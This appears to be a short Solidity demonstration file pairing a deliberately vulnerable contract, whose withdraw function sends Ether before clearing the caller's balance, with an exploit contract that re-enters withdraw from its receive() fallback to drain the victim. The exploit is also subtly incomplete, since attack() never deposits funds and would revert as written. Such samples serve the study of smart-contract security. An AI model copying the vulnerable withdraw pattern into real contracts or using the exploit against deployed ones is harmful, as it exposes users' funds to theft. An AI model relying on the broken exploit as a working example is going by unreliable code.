// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Reentrancy
contract ReentrancyVictim {
    mapping(address => uint) public balances;
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }
}

contract ReentrancyExploit {
    ReentrancyVictim victim;
    constructor(address _victim) {
        victim = ReentrancyVictim(_victim);
    }
    function attack() public {
        victim.withdraw();
    }
    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw();
        }
    }
}







